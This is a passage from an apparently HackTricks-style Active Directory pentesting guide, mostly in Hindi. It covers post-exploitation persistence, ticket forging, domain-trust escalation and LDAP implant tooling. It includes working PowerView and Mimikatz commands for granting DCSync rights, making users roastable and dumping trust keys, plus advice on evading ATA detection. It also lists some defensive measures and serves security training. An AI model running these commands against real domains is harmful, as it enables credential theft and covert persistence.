{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** domain-joined कंप्यूटरों पर स्थानीय Administrator password को manage करने का एक सिस्टम प्रदान करता है, यह सुनिश्चित करते हुए कि यह पासवर्ड **randomized**, unique और अक्सर **changed** रहता है। ये पासवर्ड Active Directory में स्टोर होते हैं और केवल authorized users को ACLs के माध्यम से एक्सेस की अनुमति दी जाती है। यदि इन पासवर्ड्स को पढ़ने के लिए पर्याप्त permissions मिल जाएँ तो अन्य कंप्यूटरों पर pivot करना संभव हो जाता है।


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromised मशीन से **certificates gather** करना environment के अंदर privileges escalate करने का एक तरीका हो सकता है:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

यदि **vulnerable templates** configured हैं तो उन्हें abuse करके privileges escalate करना संभव है:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार जब आप **Domain Admin** या उससे बेहतर **Enterprise Admin** privileges प्राप्त कर लेते हैं, तो आप domain database: _ntds.dit_ को **dump** कर सकते हैं।

[**DCSync attack के बारे में अधिक जानकारी यहां मिल सकती है**](dcsync.md).

[**NTDS.dit कैसे चुराया जाता है इसके बारे में अधिक जानकारी यहां है**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

पहले चर्चा की गई कुछ तकनीकों का उपयोग persistence के लिए भी किया जा सकता है।\
उदाहरण के लिए आप:

- उपयोगकर्ताओं को [**Kerberoast**](kerberoast.md) के लिए vulnerable बना सकते हैं

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- उपयोगकर्ताओं को [**ASREPRoast**](asreproast.md) के लिए vulnerable बना सकते हैं

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- किसी user को [**DCSync**](#dcsync) privileges दे सकते हैं

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** एक specific service के लिए एक वैध Ticket Granting Service (TGS) ticket बनाता है, जिसके लिए **NTLM hash** (उदाहरण के लिए, PC account का hash) का उपयोग किया जाता है। यह तरीका service privileges तक पहुँच प्राप्त करने के लिए प्रयोग किया जाता है।


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** में attacker Active Directory (AD) environment में **krbtgt account के NTLM hash** तक पहुंच हासिल कर लेता है। यह account विशेष है क्योंकि यह सभी **Ticket Granting Tickets (TGTs)** को sign करने के लिए प्रयोग किया जाता है, जो AD नेटवर्क के भीतर authentication के लिए आवश्यक हैं।

एक बार attacker इस hash को प्राप्त कर लेता है, वह किसी भी account के लिए **TGTs** बना सकता है (जिसे Silver ticket attack में उपयोग किया जा सकता है)।


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये Golden tickets की तरह ही होते हैं लेकिन इन्हें इस तरह से forge किया जाता है कि वे सामान्य golden ticket detection mechanisms को **bypass** कर सकें।


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

किसी account के **certificates होने** या उन्हें request करने में सक्षम होना users के account में persist करने का एक बहुत अच्छा तरीका है (यहाँ तक कि यदि user password बदल दे तो भी):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates का उपयोग domain के अंदर उच्च privileges के साथ persist करने के लिए भी संभव है:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object privileged groups (जैसे Domain Admins और Enterprise Admins) की security सुनिश्चित करने के लिए एक standard **Access Control List (ACL)** इन groups पर apply करता है ताकि unauthorized changes से सुरक्षा हो सके। हालांकि, इस feature का दुरुपयोग किया जा सकता है; यदि attacker AdminSDHolder के ACL में परिवर्तन करके किसी regular user को full access दे दे, तो उस user को सभी privileged groups पर व्यापक नियंत्रण मिल जाएगा। यह सुरक्षा उपाय, जिसका उद्देश्य रक्षा करना है, यदि अच्छी तरह मॉनिटर न किया जाए तो उल्टा असर कर सकता है और अनाधिकृत पहुंच की अनुमति दे सकता है।

[**AdminDSHolder Group के बारे में अधिक जानकारी यहाँ।**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** के अंदर एक local administrator account मौजूद होता है। ऐसी मशीन पर admin अधिकार प्राप्त करके, local Administrator hash को **mimikatz** का उपयोग करके निकाला जा सकता है। इसके बाद इस password के उपयोग को सक्षम करने के लिए registry modification आवश्यक होता है, जिससे local Administrator account तक remote access संभव हो जाता है।


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप किसी user को कुछ specific domain objects पर कुछ **विशेष permissions** दे सकते हैं जो उस user को भविष्य में privileges escalate करने की अनुमति देंगी।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** एक object पर मौजूद **permissions** को संग्रहित करने के लिए उपयोग किए जाते हैं। यदि आप किसी object के security descriptor में एक **छोटा सा बदलाव** कर दें, तो आप बिना किसी privileged group का सदस्य बने उस object पर बेहद दिलचस्प privileges प्राप्त कर सकते हैं।


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

LSASS को memory में बदलकर एक **universal password** स्थापित करें, जिससे सभी domain accounts तक पहुंच मिल सके।


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[यहाँ जानें कि SSP (Security Support Provider) क्या है।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप अपना **own SSP** बना सकते हैं ताकि मशीन तक पहुँचने के लिए उपयोग किए जाने वाले **credentials clear text में capture** किए जा सकें।


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **नए Domain Controller** को register करता है और इसे उपयोग करके निर्दिष्ट objects पर attributes (SIDHistory, SPNs...) **push** करता है बिना किसी **modifications** के logs छोड़े। इसके लिए आपको DA privileges और root domain के अंदर होना ज़रूरी है।\
ध्यान दें कि यदि आप गलत डेटा उपयोग करते हैं तो काफी ugly logs दिखाई देंगे।


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि यदि आपके पास **LAPS passwords पढ़ने के लिए पर्याप्त permission** है तो आप किस तरह privileges escalate कर सकते हैं। हालाँकि, इन passwords का उपयोग **persistence बनाए रखने** के लिए भी किया जा सकता है।\
देखें:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary के रूप में देखता है। इसका मतलब है कि **एक single domain compromise पूरे Forest के compromise का कारण बन सकता है**।

### Basic Information

एक [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है जो एक domain के user को दूसरे domain के resources तक access करने में सक्षम बनाता है। यह मूल रूप से दो domains के authentication systems के बीच एक linkage बनाता है, जिससे authentication verifications सहजता से प्रवाहित हो सकें। जब domains trust सेटअप करते हैं, तो वे अपने Domain Controllers (DCs) के भीतर कुछ specific **keys** को एक्सचेंज और संरक्षित करते हैं, जो trust की integrity के लिए महत्वपूर्ण होते हैं।

एक सामान्य परिदृश्य में, यदि कोई user किसी **trusted domain** में किसी service को access करना चाहता है, तो उसे पहले अपने domain के DC से एक विशेष ticket जिसे **inter-realm TGT** कहा जाता है, request करना होगा। यह TGT एक साझा **key** के साथ encrypt होता है जिसे दोनों domains ने सहमति से रखा होता है। फिर user यह TGT **trusted domain के DC** के पास लेकर जाता है ताकि वह एक service ticket (**TGS**) प्राप्त कर सके। trusted domain के DC द्वारा inter-realm TGT की सफल validation पर, वह TGS जारी करता है और user को service तक पहुँच मिलती है।

**Steps**:

1. एक **client computer** Domain 1 में अपनी **NTLM hash** का उपयोग करके अपने **Domain Controller (DC1)** से **Ticket Granting Ticket (TGT)** request करना शुरू करता है।
2. DC1 client के सफल authentication पर एक नया TGT जारी करता है।
3. उसके बाद client DC1 से **inter-realm TGT** request करता है, जो Domain 2 के resources को access करने के लिए आवश्यक है।
4. inter-realm TGT को दोनों-तरफ़ा domain trust के हिस्से के रूप में DC1 और DC2 के बीच साझा की गई **trust key** के साथ encrypt किया जाता है।
5. client inter-realm TGT को **Domain 2 के Domain Controller (DC2)** के पास ले जाता है।
6. DC2 अपने साझा trust key का उपयोग करके inter-realm TGT verify करता है और यदि वैध है, तो client के लिए उस server के लिए एक **Ticket Granting Service (TGS)** जारी करता है जिसे client access करना चाहता है।
7. अंत में, client यह TGS server को प्रस्तुत करता है, जो कि server के account hash से encrypt होता है, ताकि Domain 2 में service तक पहुंच सके।

### Different trusts

यह ध्यान देने योग्य है कि **trust 1 way या 2 way हो सकती है**। 2 way विकल्प में दोनों domains एक-दूसरे पर trust करते हैं, लेकिन **1 way** trust संबंध में एक domain **trusted** होगा और दूसरा **trusting** domain। अंतिम मामले में, **trusted domain से आप केवल trusting domain के अंदर के resources को ही access कर पाएंगे**।

यदि Domain A, Domain B को trust करता है, तो A trusting domain है और B trusted है। इसके अलावा, **Domain A** में यह एक **Outbound trust** होगा; और **Domain B** में यह एक **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह एक सामान्य सेटअप है उसी forest के अंदर, जहाँ एक child domain अपने parent domain के साथ स्वचालित रूप से two-way transitive trust रखता है। इसका अर्थ है कि authentication requests parent और child के बीच आसानी से प्रवाहित हो सकती हैं।
- **Cross-link Trusts**: जिन्हें "shortcut trusts" भी कहा जाता है, ये child domains के बीच स्थापित होते हैं ताकि referral प्रक्रियाओं को तेज किया जा सके। जटिल forests में, authentication referrals को सामान्यतः forest root तक ऊपर और फिर target domain तक नीचे जाना पड़ता है। cross-links बनाने से यह यात्रा कम हो जाती है, जो भौगोलिक रूप से फैले परिवेशों में विशेष रूप से उपयोगी है।
- **External Trusts**: ये अलग, unrelated domains के बीच सेट किए जाते हैं और मोक्ष-रहित (non-transitive) होते हैं। [Microsoft की documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts उस domain के resources तक पहुँचने के लिए उपयोगी होते हैं जो current forest से बाहर हो और forest trust से जुड़ा न हो। External trusts के साथ SID filtering के माध्यम से सुरक्षा मजबूत की जाती है।
- **Tree-root Trusts**: ये trusts forest root domain और हाल में जोड़े गए tree root के बीच स्वचालित रूप से स्थापित होते हैं। यह आम तौर पर इतना सामान्य नहीं है, पर tree-root trusts forest में नए domain trees जोड़ने के लिए महत्वपूर्ण होते हैं, जिससे वे एक अनूठा domain नाम बनाए रख सके और two-way transitivity सुनिश्चित हो सके। अधिक जानकारी [Microsoft के guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) में मिल सकती है।
- **Forest Trusts**: यह trust दो forest root domains के बीच एक two-way transitive trust होता है, जो security measures को बढ़ाने के लिए SID filtering भी लागू करता है।
- **MIT Trusts**: ये non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित होते हैं। MIT trusts थोड़े अधिक विशेषीकृत होते हैं और उन परिवेशों के लिए होते हैं जहाँ Windows पारिस्थितिकी तंत्र के बाहर Kerberos-आधारित systems के साथ integration की आवश्यकता होती है।

#### Other differences in **trusting relationships**

- एक trust relationship **transitive** भी हो सकती है (A trust B, B trust C, तो A trust C) या **non-transitive** भी।
- एक trust relationship को **bidirectional trust** के रूप में सेट किया जा सकता है (दोनों एक-दूसरे पर trust करते हैं) या **one-way trust** के रूप में (सिर्फ़ एक ही दूसरे पर trust करता है)।

### Attack Path

1. **Enumerate** करें trusting relationships को
2. जाँचें कि क्या कोई **security principal** (user/group/computer) को **दूसरे domain** के resources तक **access** है, शायद ACE entries या दूसरे domain के groups में होने के कारण। **domains के पार संबंधों** की तलाश करें (शायद trust इसी के लिए बनाया गया था)।
1. इस मामले में kerberoast भी एक विकल्प हो सकता है।
3. उन **accounts को compromise** करें जो domains के माध्यम से **pivot** कर सकते हैं।

Attackers के पास अन्य domain में resources तक पहुंचने के तीन प्रमुख mechanisms हो सकते हैं:

- **Local Group Membership**: Principals को machines पर local groups में जोड़ा जा सकता है, जैसे किसी server के “Administrators” group में, जिससे उन्हें उस मशीन पर काफी नियंत्रण मिल जाता है।
- **Foreign Domain Group Membership**: Principals foreign domain के groups के सदस्य भी हो सकते हैं। हालांकि, इस विधि की प्रभावशीलता trust की प्रकृति और group की scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को किसी resource तक पहुंच देने के लिए **ACL** में निर्दिष्ट किया जा सकता है, विशेषकर **ACEs** के रूप में एक **DACL** में, जो उन्हें विशिष्ट resources तक पहुंच देता है। ACLs, DACLs, और ACEs की mechanics में गहराई से जाने के इच्छुक लोगों के लिए, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” एक अमूल्य संसाधन है।

### Find external users/groups with permissions

आप **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** की जाँच करके domain में foreign security principals पा सकते हैं। ये external domain/forest के user/group होंगे।

आप यह Bloodhound में या powerview का उपयोग करके जांच सकते हैं:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
domain trusts को enumerate करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> दो **trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरा _Parent_ --> _Child_ के लिए।\
> आप current domain द्वारा प्रयुक्त key यह कमांड चलाकर देख सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Trust का दुरुपयोग करके SID-History injection के माध्यम से child/parent domain में Enterprise admin के रूप में अधिकार बढ़ाएँ:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) को कैसे exploit किया जा सकता है यह समझना महत्वपूर्ण है। Configuration NC Active Directory (AD) पर्यावरणों में एक forest भर के configuration डेटा का केंद्रीय भंडार है। यह डेटा forest के प्रत्येक Domain Controller (DC) पर replicate होता है, और writable DCs Configuration NC की writable copy रखते हैं। इसे exploit करने के लिए, आपके पास किसी DC पर **SYSTEM privileges** होने चाहिए, प्राथमिकता child DC पर।

**Link GPO to root DC site**

Configuration NC के Sites container में AD forest के भीतर सभी domain-joined कंप्यूटर्स के sites की जानकारी शामिल होती है। किसी भी DC पर SYSTEM privileges से काम करके, हमलावर GPOs को root DC sites से link कर सकते हैं। यह क्रिया उन sites पर लागू नीतियों को मोडिफाई करके root domain को संभावित रूप से compromise कर सकती है।

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

एक attack vector domain के भीतर privileged gMSAs को लक्षित करना शामिल करता है। gMSAs के पासवर्ड निकालने के लिए आवश्यक KDS Root key Configuration NC में संग्रहीत होती है। किसी भी DC पर SYSTEM privileges होने पर KDS Root key तक पहुँचकर पूरे forest में किसी भी gMSA के पासवर्ड की गणना करना संभव है।

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

यह विधि धैर्य माँगती है — नए privileged AD objects के बनने का इंतज़ार करना पड़ता है। SYSTEM privileges के साथ, एक हमलावर AD Schema को बदलकर किसी भी user को सभी classes पर पूर्ण नियंत्रण दे सकता है। इससे नए बनाए गए AD objects पर अनधिकृत पहुँच और नियंत्रण हो सकता है।

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vuln का लक्ष्य Public Key Infrastructure (PKI) objects पर नियंत्रण हासिल करना है ताकि एक certificate template बनाकर forest के किसी भी user के रूप में authentication संभव किया जा सके। चूंकि PKI objects Configuration NC में रहते हैं, एक writable child DC को compromise करने से ESC5 attacks को अंजाम देना संभव हो जाता है।

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
इस परिदृश्य में **your domain is trusted** किसी external domain द्वारा, जो आपको उस पर **undetermined permissions** देता है। आपको पता लगाना होगा **which principals of your domain have which access over the external domain** और फिर उन्हें exploit करने की कोशिश करनी होगी:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.

However, when a **domain is trusted** by the trusting domain, the trusted domain **creates a user** with a **predictable name** that uses as **password the trusted password**. Which means that it's possible to **access a user from the trusting domain to get inside the trusted one** to enumerate it and try to escalate more privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Another way to compromise the trusted domain is to wait in a machine where a **user from the trusted domain can access** to login via **RDP**. Then, the attacker could inject code in the RDP session process and **access the origin domain of the victim** from there.\
Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### डोमेन ट्रस्ट दुरुपयोग का निवारण

### **SID Filtering:**

- SID history attribute के माध्यम से forest trusts के पार किए जाने वाले हमलों के जोखिम को SID Filtering से कम किया जाता है, जो सभी inter-forest trusts पर डिफ़ॉल्ट रूप से सक्रिय होता है। यह इस आधार पर टिकता है कि intra-forest trusts सुरक्षित माने जाते हैं — Microsoft की धारणा के अनुसार सुरक्षा सीमा domain के बजाय forest है।
- हालांकि, एक समस्या यह है कि SID filtering कुछ applications और user access को बाधित कर सकता है, इसलिए इसे कभी-कभी निष्क्रिय किया जा सकता है।

### **Selective Authentication:**

- inter-forest trusts के लिए, Selective Authentication यह सुनिश्चित करता है कि दोनों forests के users स्वतः authenticate न हों। इसके बजाय, users को trusting domain या forest के भीतर domains और servers तक पहुंचने के लिए स्पष्ट permissions की आवश्यकता होती है।
- यह ध्यान में रखना महत्वपूर्ण है कि ये उपाय writable Configuration Naming Context (NC) के दुरुपयोग या trust account पर होने वाले हमलों से सुरक्षा प्रदान नहीं करते।

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## ऑन-होस्ट इम्प्लांट्स से LDAP-आधारित AD दुरुपयोग

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में re-implements करता है जो पूरी तरह एक on-host implant (उदा., Adaptix C2) के अंदर चलते हैं। Operators पैक को `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` से compile करते हैं, `ldap.axs` को load करते हैं, और फिर beacon से `ldap <subcommand>` कॉल करते हैं। सभी ट्रैफ़िक मौजूदा logon security context पर LDAP (389) में signing/sealing या LDAPS (636) में auto certificate trust के साथ चलता है, इसलिए किसी socks proxy या disk artifacts की आवश्यकता नहीं होती।

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` short names/OU paths को full DNs में resolve करते हैं और संबंधित objects को dump करते हैं।
- `get-object`, `get-attribute`, and `get-domaininfo` arbitrary attributes (including security descriptors) को खींचते हैं साथ ही `rootDSE` से forest/domain metadata भी लाते हैं।
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` roasting candidates, delegation settings, और मौजूदा [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors को सीधे LDAP से उजागर करते हैं।
- `get-acl` and `get-writable --detailed` DACL को parse करके trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance को सूचीबद्ध करते हैं, जिससे ACL privilege escalation के लिए तत्काल लक्ष्य मिलते हैं।
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ऑपरेटर को नए principals या machine accounts उन स्थानों पर स्टेज करने देते हैं जहाँ OU अधिकार मौजूद हैं। `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` सीधे लक्ष्यों को हाईजैक कर लेते हैं जब write-property अधिकार मिल जाते हैं।
- ACL-focused commands जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` किसी भी AD object पर WriteDACL/WriteOwner को password resets, group membership control, या DCSync replication privileges में बदल देते हैं बिना PowerShell/ADSI artifacts छोड़ें। `remove-*` counterparts injected ACEs साफ़ करते हैं।

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` तुरंत एक compromised user को Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) उसे AS-REP roasting के लिए मार्क करता है बिना password को छुए।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon से `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को rewrite कर देते हैं, जिससे constrained/unconstrained/RBCD attack paths सक्षम होते हैं और remote PowerShell या RSAT की जरूरत खत्म हो जाती है।

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` नियंत्रित principal के SID history में privileged SIDs inject करता है (see [SID-History Injection](sid-history-injection.md)), जिससे LDAP/LDAPS के माध्यम से stealthy access inheritance मिलता है।
- `move-object` कंप्यूटर या यूज़र्स का DN/OU बदल देता है, जिससे attacker assets को उन OUs में ले जा सकता है जहाँ delegated rights पहले से मौजूद हैं, फिर `set-password`, `add-groupmember`, या `add-spn` का दुरुपयोग कर सकते हैं।
- Tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) operator credentials या persistence harvest करने के बाद तेज rollback की अनुमति देते हैं, जिससे telemetry न्यूनतम रहती है।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: सुझाव है कि Domain Admins केवल Domain Controllers में ही लॉगिन कर सकें, और अन्य होस्ट्स पर उनका उपयोग टाला जाए।
- **Service Account Privileges**: सुरक्षा बनाए रखने के लिए Services को Domain Admin (DA) privileges के साथ नहीं चलाना चाहिए।
- **Temporal Privilege Limitation**: DA privileges की आवश्यकता वाले कामों के लिए उनकी अवधि सीमित रखनी चाहिए। इसे इस तरह किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075 का auditing करें और फिर DCs/clients पर LDAP signing और LDAPS channel binding लागू करें ताकि LDAP MITM/relay प्रयास ब्लॉक हों।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- डिसेप्शन लागू करने में जाल लगाना शामिल है, जैसे decoy users या computers, जिनके पास ऐसे फीचर हों जैसे passwords जो expire नहीं होते या जिन्हें Trusted for Delegation के रूप में चिह्नित किया गया हो। विस्तृत तरीका specific rights वाले users बनाना या उन्हें high privilege groups में जोड़ना शामिल है।
- एक व्यावहारिक उदाहरण में निम्न कमांड का उपयोग शामिल है: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- डिसेप्शन तकनीकों को तैनात करने के बारे में अधिक जानकारी [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) पर मिल सकती है।

### **Identifying Deception**

- **For User Objects**: संदिग्ध संकेतों में atypical ObjectSID, कम logons, creation dates, और कम bad password counts शामिल हैं।
- **General Indicators**: संभावित decoy objects के attributes की तुलना वास्तविक objects से करने पर असंगतियाँ सामने आ सकती हैं। ऐसे डिसेप्शन की पहचान में मदद के लिए Tools जैसे [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) उपयोगी हो सकते हैं।

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Domain Controllers पर session enumeration से बचें ताकि ATA detection न हो।
- **Ticket Impersonation**: टिकट बनाने के लिए **aes** keys का उपयोग detection से बचने में मदद करता है क्योंकि यह NTLM पर डाउनग्रेड नहीं करता।
- **DCSync Attacks**: ATA detection से बचने के लिए non-Domain Controller से execute करने की सलाह दी जाती है, क्योंकि Domain Controller से सीधे execution alerts ट्रिगर करेगा।

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
